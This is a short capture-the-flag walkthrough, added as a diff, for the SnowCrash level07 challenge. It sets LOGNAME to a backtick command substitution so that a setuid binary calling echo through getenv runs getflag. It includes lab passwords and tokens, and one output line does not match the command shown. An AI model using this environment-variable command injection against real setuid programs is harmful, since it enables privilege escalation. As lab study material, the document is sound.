@@ -1,0 +1,22 @@
+level06@SnowCrash:~$ su level07
+Password: wiok45aaoguiboiki2tuin6ub
+level07@SnowCrash:~$ ls -l
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+
+level07@SnowCrash:~$ ./level07
+level07
+
+Weird, it print the name of the executable.
+When analysing with strings we see ‘LOGNAME’ who seems to be an environment variable preceded by a ‘getenv’ and followed by ‘/bin/echo %s’.
+
+level07@SnowCrash:~$ printenv | grep LOGNAME
+LOGNAME=level07
+
+We will export ‘`getflag`’ in LOGNAME so that it executes getflag.
+
+level07@SnowCrash:~$ export LOGNAME='`getflag`'
+level07@SnowCrash:~$ printenv | grep LOGNAME
+LOGNAME=`getflag` > /tmp/exploit
+
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
